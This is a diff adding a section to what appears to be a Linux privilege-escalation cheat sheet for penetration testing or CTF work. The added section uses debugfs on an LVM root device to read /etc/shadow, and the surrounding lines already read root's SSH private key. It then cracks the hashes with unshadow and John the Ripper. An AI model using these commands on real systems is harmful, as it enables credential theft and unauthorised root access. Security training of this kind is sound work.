@@ -2181,6 +2181,24 @@ debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
 
+If the root filesystem is on LVM, use `df -lh` to identify the mapper device and point `debugfs` there:
+
+```bash
+df -lh
+# /dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.2G  4.1G  56% /
+
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs: cat /etc/passwd
+debugfs: cat /etc/shadow
+```
+
+For a full root path, copy `/etc/passwd` and `/etc/shadow`, then crack the hashes:
+
+```bash
+unshadow passwd.txt shadow.txt > unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
+```
+
 ---
 
 ### Docker Container Detection & Enumeration
